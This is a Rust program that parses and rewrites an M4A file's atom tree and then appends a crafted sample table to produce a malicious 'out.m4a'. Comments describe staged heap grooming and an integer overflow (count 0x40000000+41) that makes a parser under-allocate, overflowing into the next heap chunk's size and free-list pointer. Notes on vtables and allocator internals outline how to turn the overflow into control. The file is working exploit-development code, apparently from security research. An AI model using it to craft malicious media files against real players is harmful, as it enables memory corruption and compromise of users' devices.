
fn take<const COUNT: usize>(i: &[u8]) -> (&[u8], [u8; COUNT]) {
    (&i[COUNT..], i[..COUNT].try_into().unwrap())
}

fn taken(i: &[u8], size: usize) -> (&[u8], &[u8]) {
    (&i[size..], &i[..size])
}

fn be_u32(i: &[u8]) -> (&[u8], u32) {
    let (i, x) = take::<4>(i);
    (i, u32::from_be_bytes(x))
}

#[derive(Clone, Copy, PartialEq, Eq)]
struct Kind([u8; 4]);

impl core::fmt::Debug for Kind {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        write!(f, "Kind(\"")?;
        for i in 0..4 {
            write!(f, "{}", char::from_u32(self.0[i] as u32).unwrap())?;
        }
        write!(f, "\")")
    }
}

#[derive(Debug)]
struct AtomHead {
    length: u32,
    ident: Kind,
    extended_length: Option<u64>,
}
impl AtomHead {
    fn read(i: &[u8]) -> (&[u8], Self) {
        let (i, length) = be_u32(i);
        let (i, ident) = take::<4>(i);
        assert_ne!(length, 1);

        (i, Self {
            length,
            ident: Kind(ident),
            extended_length: None,
        })
    }

    fn write(&self, out: &mut Vec<u8>) {
        assert_eq!(self.extended_length, None);

        out.extend_from_slice(&self.length.to_be_bytes());
        out.extend_from_slice(&self.ident.0);
    }

    fn content_len(&self) -> u32 {
        assert_eq!(self.extended_length, None);
        self.length - 8
    }
}

#[derive(Debug)]
struct Ftyp {
    head: AtomHead,
    content: String,
}
impl Ftyp {
    fn read(i: &[u8]) -> (&[u8], Self) {
        let (i, head) = AtomHead::read(i);
        let (i, content) = taken(i, head.content_len() as usize);
        let content = content.into_iter().map(|&c| char::from_u32(c as u32).unwrap()).collect::<String>();
        (i, Self {
            head,
            content,
        })
    }
}

fn write_atoms(out: &mut Vec<u8>, atoms: &Vec<(AtomHead, Vec<u8>)>) {
    for (head, body) in atoms {
        head.write(out);
        out.extend_from_slice(&body);
    }
}

fn parse_body(mut i: &[u8]) -> Vec<(AtomHead, Vec<u8>)> {
    let mut out = Vec::new();
    loop {
        let (j, atom) = AtomHead::read(i);
        let (j, _body) = taken(j, atom.content_len() as usize);
        //println!("Atom: {:?}", atom);

        out.push((atom, _body.to_vec()));

        if j.is_empty() {
            break;
        }

        i = j;
    }
    out
}

fn main() {
    let file = std::fs::read("./in.m4a").unwrap();
    let mut out = parse_body(&file);

    out.retain(|r| r.0.ident == Kind(*b"moov"));

    for o in &out {
        println!("Keeping: {:?}", o.0);
    }

    let moov_data = {
        let i = &out.first().unwrap().1[..];
        let mut out = parse_body(&i);

        out.retain(|r| r.0.ident != Kind(*b"udta"));


        let trak_pos = out.iter().position(|f| f.0.ident == Kind(*b"trak")).unwrap();
        let trak_data = {
            let i = &out[trak_pos].1[..];
            let mut out = parse_body(&i);

            let mdia_pos = out.iter().position(|f| f.0.ident == Kind(*b"mdia")).unwrap();
            let mdia_data = {
                let i = &out[mdia_pos].1[..];
                let mut out = parse_body(&i);

                let minf_pos = out.iter().position(|f| f.0.ident == Kind(*b"minf")).unwrap();
                let minf_data = {
                    let i = &out[minf_pos].1[..];
                    let mut out = parse_body(&i);

                    out.retain(|r| r.0.ident != Kind(*b"smhd"));

                    let stbl_pos = out.iter().position(|f| f.0.ident == Kind(*b"stbl")).unwrap();
                    let stbl_data = {
                        let i = &out[stbl_pos].1[..];
                        let mut out = parse_body(&i);

                        out.retain(|r| r.0.ident != Kind(*b"sbgp") && r.0.ident != Kind(*b"sgpd"));

                        /*let stsz_pos = out.iter().position(|f| f.0.ident == Kind(*b"stsz")).unwrap();
                        let stsz_data = {
                            let i = &out[stsz_pos].1[..];
                            let mut out = parse_body(&i);

//                            out.retain(|r| r.0.ident != Kind(*b"sbgp") && r.0.ident != Kind(*b"sgpd"));


                            for o in &out {
                                println!("- - - - - Keeping: {:?}", o.0);
                            }

                            let mut buf = Vec::new();
                            write_atoms(&mut buf, &out);
                            buf
                        };
                        out[stsz_pos].0.length = stsz_data.len() as u32 + 8;
                        out[stsz_pos].1 = stsz_data;*/

                        for o in &out {
                            println!("- - - - - Keeping: {:?}", o.0);
                        }

                        let mut buf = Vec::new();
                        write_atoms(&mut buf, &out);
                        buf
                    };
                    out[stbl_pos].0.length = stbl_data.len() as u32 + 8;
                    out[stbl_pos].1 = stbl_data;


                    for o in &out {
                        println!("- - - - Keeping: {:?}", o.0);
                    }

                    let mut buf = Vec::new();
                    write_atoms(&mut buf, &out);
                    buf
                };
                out[minf_pos].0.length = minf_data.len() as u32 + 8;
                out[minf_pos].1 = minf_data;


                for o in &out {
                    println!("- - - Keeping: {:?}", o.0);
                }

                let mut buf = Vec::new();
                write_atoms(&mut buf, &out);
                buf
            };
            out[mdia_pos].0.length = mdia_data.len() as u32 + 8;
            out[mdia_pos].1 = mdia_data;

            for o in &out {
                println!("- - Keeping: {:?}", o.0);
            }

            let trak_edts_pos = out.iter().position(|f| f.0.ident == Kind(*b"edts")).unwrap();
            let trak_mdia_pos = out.iter().position(|f| f.0.ident == Kind(*b"mdia")).unwrap();
            out.swap(trak_mdia_pos, trak_edts_pos);


            let mut buf = Vec::new();
            write_atoms(&mut buf, &out);
            buf
        };
        out[trak_pos].0.length = trak_data.len() as u32 + 8;
        out[trak_pos].1 = trak_data;


        for o in &out {
            println!("- Keeping: {:?}", o.0);
        }

        let mut buf = Vec::new();
        write_atoms(&mut buf, &out);
        buf
    };
    out.first_mut().unwrap().0.length = moov_data.len() as u32 + 8;
    out.first_mut().unwrap().1 = moov_data;

    let mut buf = Vec::new();
    write_atoms(&mut buf, &out);

    for _ in 0..12 {
        buf.pop();
    }
    
    for _ in 0..8 {
        buf.pop();
    }
    
    
    // Version
    buf.extend_from_slice(&0x0101_0101u32.to_be_bytes());

    let stg = 3;

    //stage 1
    // alloc chunk of size (0x18*41) with no overflow
    if stg == 1 {
        let size = 41u32;

        buf.extend_from_slice(&size.to_be_bytes());

        for _ in 0..size {
            buf.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        }
    }

    //stage 2
    // alloc chunk of size (0x18*64) with no overflow
    // This chunk should end up directly after the 41 element chunk
    if stg == 2 {
        let size = 64u32;

        buf.extend_from_slice(&size.to_be_bytes());

        for _ in 0..size {
            buf.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        }
    }


    // Stage 3, exploit
    // This will end up allocating (41*0x18) due to overflow
    // We will then overflow the chunk to overwrite the header of the chunk after this one
    // Which should be the stage 2 chunk
    // This should *not* crash
    if stg == 3 {
        let size = 41;

        buf.extend_from_slice(&(0x4000_0000u32 + size).to_be_bytes());

        for _ in 0..size-1 {
            buf.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]);
            buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        }
        buf.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
        buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]);
        buf.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        buf.extend_from_slice(&[0x10, 0, 0, 0, 0, 0x8, 0x8]);

        // implied clobber of [0u8;8]
        // which will be 64_chunk->size and 64_chunk->flink
    }


    /*
    let size = 8u32;
    
    //TODO: test little-endian
    buf.extend_from_slice(&(0x4000_0000u32 + size).to_be_bytes());
    
    let alloc_arg = 0x18u32.wrapping_mul(0x4000_0000u32 + size);
    let chunk_size = (alloc_arg + 0xb) & 0xfffffffc;
    let chunk_size_sub_header = chunk_size;// - 8;
    
    assert_eq!(chunk_size_sub_header % (8+8+4), 0);
    
    // Push padding equal to size of chunk
    for _ in 0..chunk_size_sub_header {
        buf.push(0x0);
    }*/
// Question: why does any corruption here cause overflows
    // idea: the heap first tries to call a function pointer on something that might be a bucketed allocator before using the free list
    // As a result I don't think we are clobbering anything in the freelist, I think we are clobbering a different type of chunk
    // So we need to figure out the heap creation logic, figure out the vtable used, find the function called, figure out what is after a heap allocation
    // And then figure out what we actually have control over when corrupting a chunk not in the free list

    



    std::fs::write("./out.m4a", buf).unwrap();
}

#[test]
fn foo() {
    fn nest(mut i: &[u8], idx: u8) {
        loop {
            let (j, atom) = AtomHead::read(i);
            if atom.length < 8 {
                break;
            }

            if i.len() < atom.content_len() as usize {
                break;
            }

            let (j, _body) = taken(j, atom.content_len() as usize);
            for _ in 0..idx {
                print!("-- ");
            }
            println!("Atom: {:?}", atom);
            nest(_body, idx+1);

            if j.is_empty() {
                break;
            }

            i = j;
        }
    }

    let file = std::fs::read("./out.m4a").unwrap();
    let mut i = &file[..];
    nest(i, 0);
}

#[test]
fn bar() {
    fn nest(mut i: &[u8], idx: u8) -> Vec<u8>{
        let mut out: Vec<(AtomHead, Vec<u8>)> = Vec::new();
        loop {
            let (j, atom) = AtomHead::read(i);
            if atom.length < 8 {
                break;
            }

            if i.len() < atom.content_len() as usize {
                break;
            }

            let (j, body) = taken(j, atom.content_len() as usize);
            let body = nest(body, idx+1);
            for _ in 0..idx {
                print!("-- ");
            }
            println!("Atom: {:?}", atom);

            out.push((atom, body));

            if j.is_empty() {
                break;
            }

            i = j;
        }

        let mut buf = Vec::new();


        if out.is_empty() {
            buf.extend_from_slice(i);
        } else {
            //retain

            write_atoms(&mut buf, &out);
        }

        buf
    }

    let file = std::fs::read("./out.m4a").unwrap();
    let mut i = &file[..];
    let body = nest(i, 0);
    std::fs::write("./foo.m4a", &body).unwrap();
}
